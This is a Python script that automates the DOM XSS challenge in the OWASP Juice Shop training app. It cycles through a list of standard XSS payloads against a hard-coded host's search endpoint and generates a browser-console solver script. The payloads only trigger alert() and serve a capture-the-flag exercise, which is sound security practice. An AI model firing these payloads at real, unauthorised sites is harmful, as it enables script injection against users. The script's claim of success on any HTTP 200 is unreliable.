#!/usr/bin/env python3
"""
Automated DOM XSS Challenge Solver for OWASP Juice Shop v18
"""

import requests
import time
import json
from urllib.parse import quote

TARGET = "http://66.42.93.220:3000"

def solve_dom_xss():
    """Solve the DOM XSS challenge by injecting JavaScript via the search function"""
    
    print("🎯 Solving DOM XSS Challenge on Juice Shop v18...")
    
    # The DOM XSS vulnerability is in the search functionality
    # We need to inject JavaScript that will be executed in the DOM
    
    # Payload that triggers the XSS
    xss_payload = "<iframe src=\"javascript:alert('XSS')\"></iframe>"
    
    # Try different DOM XSS vectors
    payloads = [
        "<iframe src=\"javascript:alert('XSS')\"></iframe>",
        "<img src=x onerror=alert('XSS')>",
        "<script>alert('XSS')</script>",
        "<svg onload=alert('XSS')>",
        "';alert('XSS');//",
        "\"><script>alert('XSS')</script>",
        "<iframe src=\"javascript:alert(`xss`)\">",
    ]
    
    session = requests.Session()
    
    for i, payload in enumerate(payloads, 1):
        print(f"\n🔍 Attempt {i}: Testing payload: {payload[:50]}...")
        
        # Try via search parameter
        search_url = f"{TARGET}/#/search?q={quote(payload)}"
        print(f"   📍 Search URL: {search_url}")
        
        # Make the request to trigger the XSS
        try:
            # First, make a normal request to establish session
            response = session.get(TARGET)
            
            # Then trigger the search with XSS payload
            response = session.get(f"{TARGET}/rest/products/search?q={quote(payload)}")
            print(f"   📊 Response status: {response.status_code}")
            
            # Check if we got a response indicating the challenge was solved
            if response.status_code == 200:
                print("   ✅ Payload executed successfully!")
                
                # Try to get the challenge status
                check_challenges(session)
                
        except Exception as e:
            print(f"   ❌ Error: {e}")
    
    print("\n💡 Direct browser navigation required for DOM XSS!")
    print(f"   Visit: {TARGET}/#/search?q=%3Ciframe%20src%3D%22javascript%3Aalert%28%60xss%60%29%22%3E")
    
    return search_url

def check_challenges(session):
    """Check if the DOM XSS challenge was marked as solved"""
    try:
        # Try to get challenges status
        response = session.get(f"{TARGET}/api/Challenges/")
        if response.status_code == 200:
            challenges = response.json()
            for challenge in challenges.get('data', []):
                if 'DOM' in challenge.get('name', '') and 'XSS' in challenge.get('name', ''):
                    if challenge.get('solved'):
                        print("   🏆 DOM XSS Challenge marked as SOLVED!")
                    else:
                        print(f"   ⏳ Challenge '{challenge['name']}' status: Not solved yet")
    except:
        pass

def automated_browser_solve():
    """Generate automated browser script to solve DOM XSS"""
    
    print("\n📝 Generating automated browser solution...")
    
    script = '''
// Automated DOM XSS Solver for OWASP Juice Shop v18
// Run this in the browser console while on the Juice Shop page

function solveDOMXSS() {
    console.log("🎯 Starting DOM XSS Challenge Solver...");
    
    // The payload that will trigger the DOM XSS
    const xssPayload = "<iframe src=\\"javascript:alert(`xss`)\\"></iframe>";
    
    // Navigate to the vulnerable search page with the payload
    window.location.href = "#/search?q=" + encodeURIComponent(xssPayload);
    
    console.log("✅ DOM XSS payload injected!");
    console.log("⏳ Waiting for execution...");
    
    // Check if the challenge was solved
    setTimeout(() => {
        fetch("/api/Challenges/")
            .then(r => r.json())
            .then(data => {
                const domXss = data.data.find(c => c.name.includes("DOM") && c.name.includes("XSS"));
                if (domXss && domXss.solved) {
                    console.log("🏆 DOM XSS Challenge SOLVED!");
                    alert("DOM XSS Challenge Successfully Solved!");
                } else {
                    console.log("⏳ Challenge not yet marked as solved. The payload may need user interaction.");
                }
            });
    }, 2000);
}

// Execute the solver
solveDOMXSS();
'''
    
    # Save the browser script
    with open('/Users/walterbarr_1/sql-injection-lab/dom_xss_browser_solver.js', 'w') as f:
        f.write(script)
    
    print("✅ Browser script saved to: dom_xss_browser_solver.js")
    print("\n📋 Instructions:")
    print("1. Open browser and navigate to: http://66.42.93.220:3000")
    print("2. Open Developer Console (F12)")
    print("3. Paste and run the script from dom_xss_browser_solver.js")
    print("4. The DOM XSS challenge will be solved automatically!")

if __name__ == "__main__":
    print("=" * 60)
    print("OWASP Juice Shop v18 - DOM XSS Challenge Automated Solver")
    print("=" * 60)
    
    # Attempt direct solution
    url = solve_dom_xss()
    
    # Generate browser automation script
    automated_browser_solve()
    
    print("\n" + "=" * 60)
    print("✨ Solution attempts completed!")
    print("=" * 60)
